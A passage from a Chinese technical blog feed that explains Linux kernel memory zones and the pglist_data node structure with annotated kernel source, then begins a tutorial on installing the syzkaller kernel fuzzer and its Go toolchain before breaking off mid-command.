class="hljs-comment">     *    buddy (e.g., via XEN-balloon, Hyper-V balloon, virtio-mem). The</span><br><span class="hljs-comment">     *    parts not manged by the buddy are unmovable PG_offline pages. In</span><br><span class="hljs-comment">     *    some cases (virtio-mem), such pages can be skipped during</span><br><span class="hljs-comment">     *    memory offlining, however, cannot be moved/allocated. These</span><br><span class="hljs-comment">     *    techniques might use alloc_contig_range() to hide previously</span><br><span class="hljs-comment">     *    exposed pages from the buddy again (e.g., to implement some sort</span><br><span class="hljs-comment">     *    of memory unplug in virtio-mem).</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * In general, no unmovable allocations that degrade memory offlining</span><br><span class="hljs-comment">     * should end up in ZONE_MOVABLE. Allocators (like alloc_contig_range())</span><br><span class="hljs-comment">     * have to expect that migrating pages in ZONE_MOVABLE can fail (even</span><br><span class="hljs-comment">     * if has_unmovable_pages() states that there are no unmovable pages,</span><br><span class="hljs-comment">     * there can be false negatives).</span><br><span class="hljs-comment">     */</span><br>    ZONE_MOVABLE,<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_ZONE_DEVICE</span><br>    ZONE_DEVICE,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    __MAX_NR_ZONES<br><br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="X86-32"><a href="#X86-32" class="headerlink" title="X86-32"></a>X86-32</h3><p>如下表格所示（懒得找图了）</p><table><thead><tr><th align="center">Type</th><th align="center">Start address</th><th align="center">End address</th></tr></thead><tbody><tr><td align="center">ZONE_DMA</td><td align="center">0MB</td><td align="center">16MB</td></tr><tr><td align="center">ZONE_NORMAL</td><td align="center">16MB</td><td align="center">896MB</td></tr><tr><td align="center">ZONE_HIGHMEM</td><td align="center">896MB</td><td align="center">…</td></tr></tbody></table><p>通常我们简单地划分为两部分：</p><ul><li><code>线性映射区</code>（前 896MB）：这一块内存直接映射到物理内存地址 0 起始往后的总计 896MB，为<strong>线性映射</strong></li><li><code>高端内存</code>（从 896MB 开始往后）：这一块内存的映射是<strong>不连续的</strong></li></ul><h3 id="X86-64"><a href="#X86-64" class="headerlink" title="X86-64"></a>X86-64</h3><p>如下表格所示（懒得找图了）</p><table><thead><tr><th align="center">Type</th><th align="center">Start address</th><th align="center">End address</th></tr></thead><tbody><tr><td align="center">ZONE_DMA</td><td align="center">0MB</td><td align="center">16MB</td></tr><tr><td align="center">ZONE_DMA32</td><td align="center">16MB</td><td align="center">4GB</td></tr><tr><td align="center">ZONE_NORMAL</td><td align="center">4GB</td><td align="center">…</td></tr></tbody></table><p>在 64 位的 Linux kernel 中没有了“高端内存”这一概念</p><h1 id="0x03-struct-pglist-data：节点"><a href="#0x03-struct-pglist-data：节点" class="headerlink" title="0x03.struct pglist_data：节点"></a>0x03.struct pglist_data：节点</h1><p>zone 再向上一层便是<strong>节点</strong>——Linux 将_内存控制器（memory controller）_作为节点划分的依据，对于 UMA 架构而言只有一个节点，而对于 NUMA 架构而言通常有多个节点，对于同一个内存控制器下的 CPU 而言其对应的节点称之为_本地内存_，不同处理器之间通过总线进行进一步的连接。如下图所示，一个MC对应一个节点：</p><p><img src="https://i.loli.net/2021/11/27/hAopSNYg23VeWzq.png" alt="image.png"></p><p>一个节点使用 <code>pglist_data</code> 结构进行描述，该结构定义于 <code>/include/linux/mmzone.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 在 NUMA 机器上, 每个 NUMA 节点都有一个 pg_data_t 用以描述其内存布局。</span><br><span class="hljs-comment"> * 在 UMA 机器上则只有一个单独的 pglist_data 描述整个内存。</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * 内存统计数据与页置换数据结构由一个 per-zone basis维持</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pglist_data</span> &#123;</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * node_zones 字段包含该节点所拥有的 zones。 并非所有的 zone 都已被填充，但这是一个满的列表。</span><br><span class="hljs-comment">     * 它被该节点的 node_zonelists 以及其他节点的 node_zonelists 所引用.</span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zone</span> <span class="hljs-title">node_zones</span>[<span class="hljs-title">MAX_NR_ZONES</span>];</span><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * node_zonelists 包含有对所有节点中所有区的引用。</span><br><span class="hljs-comment">     * 通常第一个区将会作为该节点的 node_zones 的引用.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zonelist</span> <span class="hljs-title">node_zonelists</span>[<span class="hljs-title">MAX_ZONELISTS</span>];</span><br><br>    <span class="hljs-type">int</span> nr_zones; <span class="hljs-comment">/* 该节点中被填充的 zone 的数量 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_FLAT_NODE_MEM_MAP    <span class="hljs-comment">/* 即 SPARSEMEM */</span></span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">node_mem_map</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_PAGE_EXTENSION</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page_ext</span> *<span class="hljs-title">node_page_ext</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(CONFIG_MEMORY_HOTPLUG) || defined(CONFIG_DEFERRED_STRUCT_PAGE_INIT)</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 若你期望 node_start_pfn, node_present_pages, </span><br><span class="hljs-comment">     * node_spanned_pages 或 nr_zones 保持不变，</span><br><span class="hljs-comment">     * 必须在任何时刻持有（这个锁）。</span><br><span class="hljs-comment">     * 同时在 deferred page 初始化期间对 pgdat-&gt;first_deferred_pfn 进行同步。</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * （内核）提供了 pgdat_resize_lock() 与 pgdat_resize_unlock() </span><br><span class="hljs-comment">     * 以在没有对 CONFIG_MEMORY_HOTPLUG 或 CONFIG_DEFERRED_STRUCT_PAGE_INIT</span><br><span class="hljs-comment">     * 进行检查的情况下操纵 node_size_lock </span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * 基于 zone-&gt;lock 与 zone-&gt;span_seqlock</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">spinlock_t</span> node_size_lock;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> node_start_pfn;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> node_present_pages; <span class="hljs-comment">/* 所有物理页的数量 */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> node_spanned_pages; <span class="hljs-comment">/* 所有物理页的大小，包括空洞 */</span><br><br>    <span class="hljs-type">int</span> node_id;<br>    <span class="hljs-type">wait_queue_head_t</span> kswapd_wait;<br>    <span class="hljs-type">wait_queue_head_t</span> pfmemalloc_wait;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> *<span class="hljs-title">kswapd</span>;</span>    <span class="hljs-comment">/* 由 mem_hotplug_begin/end() 保护 */</span><br><br>    <span class="hljs-type">int</span> kswapd_order;<br>    <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">zone_type</span> <span class="hljs-title">kswapd_highest_zoneidx</span>;</span><br><br>    <span class="hljs-type">int</span> kswapd_failures;        <span class="hljs-comment">/* 进行了 &#x27;reclaimed == 0&#x27; 判断的次数 */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_COMPACTION</span><br>    <span class="hljs-type">int</span> kcompactd_max_order;<br>    <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">zone_type</span> <span class="hljs-title">kcompactd_highest_zoneidx</span>;</span><br>    <span class="hljs-type">wait_queue_head_t</span> kcompactd_wait;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> *<span class="hljs-title">kcompactd</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 这是每个 node 保留的对用户空间分配不可用的页面</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>        totalreserve_pages;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_NUMA</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 若存在更多的未映射页面，则节点回收将会变得活跃</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>        min_unmapped_pages;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>        min_slab_pages;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* CONFIG_NUMA */</span></span><br><br>    <span class="hljs-comment">/* 页回收使用的写敏感字段 */</span><br>    ZONE_PADDING(_pad1_)<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_DEFERRED_STRUCT_PAGE_INIT</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 若在大机器上的内存初始化被推迟了，那么这是</span><br><span class="hljs-comment">     * 第一个需要被初始化的 PFN</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> first_deferred_pfn;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* CONFIG_DEFERRED_STRUCT_PAGE_INIT */</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_TRANSPARENT_HUGEPAGE</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">deferred_split</span> <span class="hljs-title">deferred_split_queue</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-comment">/* 页回收扫描器通常访问的字段 */</span><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * <span class="hljs-doctag">NOTE:</span> 若开启了 MEMCG 则其将不会被使用</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * 使用 mem_cgroup_lruvec() 以查询 lruvecs.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">lruvec</span>        __<span class="hljs-title">lruvec</span>;</span><br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>        flags;<br><br>    ZONE_PADDING(_pad2_)<br><br>    <span class="hljs-comment">/* Per-node vmstats */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">per_cpu_nodestat</span> __<span class="hljs-title">percpu</span> *<span class="hljs-title">per_cpu_nodestats</span>;</span><br>    <span class="hljs-type">atomic_long_t</span>        vm_stat[NR_VM_NODE_STAT_ITEMS];<br>&#125; <span class="hljs-type">pg_data_t</span>;<br></code></pre></td></tr></table></figure><h2 id="几个比较重要的字段"><a href="#几个比较重要的字段" class="headerlink" title="几个比较重要的字段"></a>几个比较重要的字段</h2><p>简单讲讲其中几个重要的成员</p><h3 id="node-zones-：node-的-zone-列表"><a href="#node-zones-：node-的-zone-列表" class="headerlink" title="**node_zones**：node 的 zone 列表"></a>**node_zones**：node 的 zone 列表</h3><p>节点中最重要的字段 <code>node_zones</code> 作为一个 <code>zone 结构体数组</code> 记录了<strong>本节点上所有的 zone</strong>，其中有效的 zone 的个数由节点结构体的 <code>nr_zones</code> 字段指出</p><h3 id="node-zonelists：内存分配时备用-zone-的搜索顺序"><a href="#node-zonelists：内存分配时备用-zone-的搜索顺序" class="headerlink" title="node_zonelists：内存分配时备用 zone 的搜索顺序"></a>node_zonelists：内存分配时备用 zone 的搜索顺序</h3><p>该字段用以确定内存分配时对备用的 zone 的搜索顺序，在本节点常规内存分配失败时会沿着这个数组进行搜索，其中包含的 zone <strong>可以是非本节点的 zone</strong></p><p>这是一个其为一个 <code>zonelist</code> 类型的<strong>结构体数组</strong>，该结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 单次分配请求在一个 zonelist 上操作. 一个 zonelist 便是一组 zone 的列表，</span><br><span class="hljs-comment"> * 其中第一个 zone 为分配的“目标”，而其他的 zone 为后备的zone，优先级降低。</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 为了提高 zonelist 的读取速度, 在 zonerefs 中包含正在被读取的 entry 的 zone index。</span><br><span class="hljs-comment"> * 用来访问所给的 zoneref 结构体信息的帮助函数有：</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * zonelist_zone()- 返回一个 struct zone 的指针作为 _zonerefs 中的一个 entry</span><br><span class="hljs-comment"> * zonelist_zone_idx()- 返回作为 entry 的 zone 的 index</span><br><span class="hljs-comment"> * zonelist_node_idx()- 返回作为 entry 的 node 的 index</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zonelist</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zoneref</span> _<span class="hljs-title">zonerefs</span>[<span class="hljs-title">MAX_ZONES_PER_ZONELIST</span> + 1];</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>可以看到的是其为一个  <code>zoneref</code> 类型的结构体数组，该结构体定义如下，包含了一个 zone 的指针以及一个 index：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 该结构包含了 zonelist 中一个 zone 的信息。 </span><br><span class="hljs-comment"> * 其被储存在这里以预防对大结构体的解引用与对表的查询。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zoneref</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zone</span> *<span class="hljs-title">zone</span>;</span><span class="hljs-comment">/* 指向实际上的 zone 的指针 */</span><br><span class="hljs-type">int</span> zone_idx;<span class="hljs-comment">/* zone_idx(zoneref-&gt;zone) */</span><br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="nr-zones：node-中-zone-的数量"><a href="#nr-zones：node-中-zone-的数量" class="headerlink" title="nr_zones：node 中 zone 的数量"></a>nr_zones：node 中 zone 的数量</h3><p>该字段存储了该节点中所有可用的 zone 的数量</p><h3 id="node-start-pfn：node-的起始页框标号"><a href="#node-start-pfn：node-的起始页框标号" class="headerlink" title="node_start_pfn：node 的起始页框标号"></a>node_start_pfn：node 的起始页框标号</h3><p>该字段记录了该节点上的物理内存起始页框标号</p><h3 id="node-present-pages：node-中物理页的总数量"><a href="#node-present-pages：node-中物理页的总数量" class="headerlink" title="node_present_pages：node 中物理页的总数量"></a>node_present_pages：node 中物理页的总数量</h3><p>该字段记录了节点中可用的物理页的总数量</p><h3 id="unsigned-long-node-spanned-pages：-node-中物理页的总大小"><a href="#unsigned-long-node-spanned-pages：-node-中物理页的总大小" class="headerlink" title="unsigned long node_spanned_pages： node 中物理页的总大小"></a>unsigned long node_spanned_pages： node 中物理页的总大小</h3><p>该字段记录了节点上<strong>包括空洞在内</strong>的页帧为单位的该节点内存的总长度</p><h3 id="node-id：node-的标号"><a href="#node-id：node-的标号" class="headerlink" title="node_id：node 的标号"></a>node_id：node 的标号</h3><p>该字段记录了该节点在系统中的标号，从 0 开始</p><h2 id="node-存储方式：全局数组-node-data"><a href="#node-存储方式：全局数组-node-data" class="headerlink" title="node 存储方式：全局数组 node_data[]"></a>node 存储方式：全局数组 node_data[]</h2><p>在 <code>/arch/x86/mm/numa.c</code> 中定义了一个 pglist_data 数组，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pglist_data</span> *<span class="hljs-title">node_data</span>[<span class="hljs-title">MAX_NUMNODES</span>] __<span class="hljs-title">read_mostly</span>;</span><br>EXPORT_SYMBOL(node_data);<br></code></pre></td></tr></table></figure><p>该数组中保存了系统中的<strong>所有的节点</strong></p><p>由此，我们最终得到这样一张架构图：</p><blockquote><p>还是偷的图，侵删</p></blockquote><p><img src="https://i.loli.net/2021/11/28/KcHILforOySi8YR.png" alt="image.png"></p><blockquote><p>我们可以使用 <code>numactl</code> 工具来查看系统中的节点信息，如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">numactl --hardware</span><br>available: 1 nodes (0)<br>node 0 cpus: 0 1 2 3<br>node 0 size: 11942 MB<br>node 0 free: 4464 MB<br>node distances:<br>node   0 <br>  0:  10 <br></code></pre></td></tr></table></figure><blockquote><p>笔者的机器比较弱，只有一个节点</p></blockquote></blockquote><h2 id="node-状态：全局数组-node-states"><a href="#node-状态：全局数组-node-states" class="headerlink" title="node 状态：全局数组 node_states[]"></a>node 状态：全局数组 node_states[]</h2><p>在 <code>/mm/page_alloc.c</code> 中定义了一个全局数组 <code>node_states</code> 用以标识对应标号的节点的状态，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Array of node states.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">nodemask_t</span> node_states[NR_NODE_STATES] __read_mostly = &#123;<br>    [N_POSSIBLE] = NODE_MASK_ALL,<br>    [N_ONLINE] = &#123; &#123; [<span class="hljs-number">0</span>] = <span class="hljs-number">1UL</span> &#125; &#125;,<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_NUMA</span><br>    [N_NORMAL_MEMORY] = &#123; &#123; [<span class="hljs-number">0</span>] = <span class="hljs-number">1UL</span> &#125; &#125;,<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_HIGHMEM</span><br>    [N_HIGH_MEMORY] = &#123; &#123; [<span class="hljs-number">0</span>] = <span class="hljs-number">1UL</span> &#125; &#125;,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    [N_MEMORY] = &#123; &#123; [<span class="hljs-number">0</span>] = <span class="hljs-number">1UL</span> &#125; &#125;,<br>    [N_CPU] = &#123; &#123; [<span class="hljs-number">0</span>] = <span class="hljs-number">1UL</span> &#125; &#125;,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span>    <span class="hljs-comment">/* NUMA */</span></span><br>&#125;;<br>EXPORT_SYMBOL(node_states);<br></code></pre></td></tr></table></figure><p>在这里的 <code>nodemask_t</code> 类型为一个<strong>位图</strong>类型，定义于 <code>/include/linux/nodemask.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> DECLARE_BITMAP(bits, MAX_NUMNODES); &#125; <span class="hljs-type">nodemask_t</span>;<br></code></pre></td></tr></table></figure><p>这个状态由一个枚举类型 <code>node_states</code> 定义，该枚举类型定义于 <code>/include/linux/nodemask.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 位掩码将为所有节点保存</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">node_states</span> &#123;</span><br>    N_POSSIBLE,        <span class="hljs-comment">/* 节点在某个时刻是联机的 */</span><br>    N_ONLINE,        <span class="hljs-comment">/* 节点是联机的 */</span><br>    N_NORMAL_MEMORY,    <span class="hljs-comment">/* 节点有着普通的内存 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_HIGHMEM</span><br>    N_HIGH_MEMORY,        <span class="hljs-comment">/* 节点有着普通或高端内存 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    N_HIGH_MEMORY = N_NORMAL_MEMORY,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    N_MEMORY,        <span class="hljs-comment">/* 节点有着内存(普通，高端，可移动) */</span><br>    N_CPU,        <span class="hljs-comment">/* 节点有着一个或多个 cpu */</span><br>    N_GENERIC_INITIATOR,    <span class="hljs-comment">/* 节点有一个或多个 Generic Initiators */</span><br>    NR_NODE_STATES<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;无内鬼，来点内存条&lt;/p&gt;</summary>
    
    
    
    <category term="OS" scheme="http://blog.arttnba3.cn/categories/OS/"/>
    
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="学习札记" scheme="http://blog.arttnba3.cn/tags/%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="内存管理" scheme="http://blog.arttnba3.cn/tags/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>【FUZZ.0x01】syzkaller - I：基本使用方法</title>
    <link href="http://blog.arttnba3.cn/2021/11/24/FUZZ-0X01-SYZKALLER-I/"/>
    <id>http://blog.arttnba3.cn/2021/11/24/FUZZ-0X01-SYZKALLER-I/</id>
    <published>2021-11-23T19:09:11.000Z</published>
    <updated>2022-08-28T20:48:01.291Z</updated>
    
    <content type="html"><![CDATA[<p>尝试遍历所有的世界线</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>syzkaller 是由 Google 开发的一个十分强大的针对内核的 fuzzer，自其面世以来已经帮助全世界的内核安全研究员发现了数量惊人的内核漏洞</p><p>本篇文章中笔者将简述 syzkaller 的使用方法</p><h1 id="0x01-环境配置"><a href="#0x01-环境配置" class="headerlink" title="0x01.环境配置"></a>0x01.环境配置</h1><blockquote><p>这里参照官方文档进行配置： <a href="https://github.com/google/syzkaller">https://github.com/google/syzkaller</a></p><p>笔者本地环境：Ubuntu 21.04</p></blockquote><p><strong>在安装之前请确保你的电脑具有足够的运行内存与存储空间！</strong>（笔者的2G阿里云学生机就被搞炸了</p><p>要使用 syzkaller 进行漏洞挖掘，我们需要：</p><ul><li><code>Go compiler and syzkaller itself</code></li><li><code>C compiler with coverage support</code></li><li><code>Linux kernel with coverage additions</code></li><li><code>Virtual machine or a physical device</code></li></ul><h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt update</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt install make gcc flex bison libncurses-dev libelf-dev libssl-dev clang clang-format</span><br></code></pre></td></tr></table></figure><h2 id="配置-golang-环境"><a href="#配置-golang-环境" class="headerlink" title="配置 golang 环境"></a>配置 golang 环境</h2><p>首先配置 golang 环境，可以参照<a href="https://golang.org/doc/install">官方文档</a>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">wget https://dl.google.com/go/go1.14.2.linux-amd64.tar.gz</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">tar -xf go1.14.2.linux-amd64.tar.gz</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mv</span> go goroot</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> gopath</span><br></code></pre></td></tr></table></figure><p>在 <code>/etc/profile</code> 中写入如下配置，重启，这里需要注意的是 <code>YourGoPath</code><strong>应当替换为你实际存放 go 的路径</strong>，在上一步的终端中输入 <code>pwd</code> 后将其值替换到下方</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> GOPATH=YourGoPath/gopath<br><span class="hljs-built_in">export</span> GOROOT=YourGoPath/goroot<br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$GOPATH</span>/bin:<span class="hljs-variable">$PATH</span><br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$GOROOT</span>/bin:<span class="hljs-variable">$PATH</span><br></code></pre></td></tr></table></figure><h2 id="编译-syzkaller"><a href="#编译-syzkaller" class="headerlink" title="编译 syzkaller"></a>编译 syzkaller</h2><p>安装 syzkaller 本体</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">go get -u -d github.com/google/syzkaller/prog</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span 